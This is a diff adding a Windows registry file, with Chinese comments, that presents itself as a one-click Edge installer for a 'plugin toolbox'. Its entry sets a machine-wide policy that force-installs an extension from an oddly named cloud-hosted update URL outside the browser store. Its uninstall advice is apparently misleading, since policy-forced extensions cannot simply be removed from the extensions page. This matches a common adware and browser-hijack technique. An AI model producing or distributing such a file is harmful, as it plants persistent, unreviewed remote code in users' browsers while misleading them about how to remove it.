@@ -1,0 +1,12 @@
+Windows Registry Editor Version 5.00
+
+; ============================================================
+; 插件工作箱 v2.2.78 — Edge 一键安装
+; ============================================================
+; 使用方法：双击此文件 → 点"是" → 重启 Edge → 自动安装
+; 卸载方法：edge://extensions/ 删除扩展 + regedit 删除下方注册表项
+; ============================================================
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge]
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist]
+"1"="nmpdifejooglhkcilhgjkhggbioalojk;https://renewal-calendar-7ff2rtj4f876144-1259283480.tcloudbaseapp.com/extensions/toolbox/update.xml"
